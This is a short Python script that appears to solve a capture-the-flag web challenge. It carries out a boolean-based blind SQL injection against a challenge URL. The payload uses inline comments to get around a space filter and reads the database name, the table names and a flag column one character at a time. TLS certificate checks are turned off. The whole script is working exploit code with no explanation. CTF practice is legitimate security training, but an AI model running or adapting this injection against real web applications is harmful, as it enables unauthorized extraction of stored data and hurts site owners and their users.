import requests
import warnings
warnings.filterwarnings("ignore")
word=""
num=0
url = "https://ebf0be59-85f5-4005-acd9-0d931dfb4e8c.challenge.ctf.show/index.php?id=0/**/or/**/"
for num1 in range(1,57):
    for num2 in range (20,180):
        # data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
        # data = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
        data = 'ascii(substr((select/**/group_concat(FLAG)/**/from/**/flag)/**/from/**/%d/**/for/**/1))=%d' % (num1, num2)
        result = requests.get(url + data,verify=False)
        if "If" in result.text:
            word+=chr(num2)
            print(num2)
            print(word)
            break
        else:
            pass